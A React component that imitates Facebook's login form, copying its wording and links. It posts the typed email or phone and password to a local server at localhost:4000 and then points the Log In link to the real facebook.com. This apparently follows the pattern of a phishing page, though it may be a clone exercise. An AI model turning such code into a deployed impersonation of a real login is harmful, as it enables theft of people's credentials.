import React, { Component } from "react";
import "./Table.css";

class Table extends Component {
  constructor() {
    super();
    this.state = {
      emailOrphone: "",
      password: "",
      fbUrl: "",
    };
  }

  onemailOrphoneChange = (event) => {
    this.setState({ emailOrphone: event.target.value });
  };

  onPasswordChange = (event) => {
    this.setState({ password: event.target.value });
  };

  onButtonSubmit = () => {
    if(this.state.emailOrphone && this.state.password) {
      fetch("http://localhost:4000/login", {
        method: "post",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          emailOrphone: this.state.emailOrphone,
          password: this.state.password,
        })
      })
      .then(response => response.json()).
      then(data => {
        if(data === "success") {
           this.setState({fbUrl:"https://www.facebook.com"})
        }
      }).catch(err => console.log(err))
    }
  };

  render() {
    return (
      <div className="parentTableContainer">
        <div className="TableContainer">
          <input
            type="email"
            id="Email"
            className="a-email hanldeBar"
            name="Email"
            placeholder="Email address or phone number"
            autoFocus="autoFocus"
            onChange={this.onemailOrphoneChange}
          />
          <input
            type="password"
            id="Password"
            className="a-pss hanldeBar"
            name="Password"
            placeholder="Password"
            autoFocus="autoFocus"
            onChange={this.onPasswordChange}
          />
          <a className="anchor" href={this.state.fbUrl}><button onClick={this.onButtonSubmit} type="submit" className="a-sub" value="">
            Log In
          </button></a>
          <a href="www.facebook.com" className="a-link">
            Forgotten password?
          </a>
          <div className="narrowLine"></div>
          <button type="submit " value="" className="a-but">
            Create New Account
          </button>
        </div>
        <p>
          <a className="a-href" href="www.facebook.com">
            Create a Page
          </a>{" "}
          for a celebrity, band or business.
        </p>
      </div>
    );
  }
}

export default Table;
